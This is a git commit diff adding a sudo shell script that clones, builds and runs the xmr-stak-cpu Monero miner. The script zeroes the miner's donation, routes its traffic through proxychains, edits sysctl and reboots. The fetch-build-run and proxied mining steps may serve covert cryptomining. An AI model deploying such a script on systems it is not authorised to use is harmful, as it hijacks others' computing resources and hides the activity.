110b72df884337187bd6012b52cce47395df99e6
smithinoz <smithinoz@users.noreply.github.com>
2017-06-18 22:28:40 +1000

    Update g.sh

--- g.sh
+++ g.sh
@@ -1,4 +1,36 @@
 #!/bin/bash
+sudo sysctl -w vm.nr_hugepages=128
+file="/flag1"
+if [ -f "$file" ]
+then
+    	sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
+	sudo apt-get install cmake -y
+	cd /m/test01
+	sudo git clone --recursive https://github.com/rofl0r/proxychains-ng.git	
+	cd /m/test01/proxychains-ng
+	sudo  ./configure --prefix=/usr --sysconfdir=/etc
+	sudo make
+	cd /m/test01
+	sudo apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
+	sudo git clone --recursive https://github.com/fireice-uk/xmr-stak-cpu.git
+	cd /m/test01/xmr-stak-cpu
+	sudo sed -i 's/1.0/0.0/' /m/test01/xmr-stak-cpu/donate-level.h
+	sudo cmake -DCMAKE_LINK_STATIC=ON . -DMICROHTTPD_REQUIRED=OFF
+	sudo make
+	sudo make install
+	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
+	cd /m/test01/xmr-stak-cpu/bin/
+	sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu
+  	sudo reboot   
+else
+  sudo /bin/su -c "echo 'xxxxx' >> /$file"
+  sudo reboot  
+fi
+
+
+
+
+
 sudo apt-get remove sendmail -y
 sudo apt-get install git build-essential libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
 sudo apt-get install openssl-devel -y
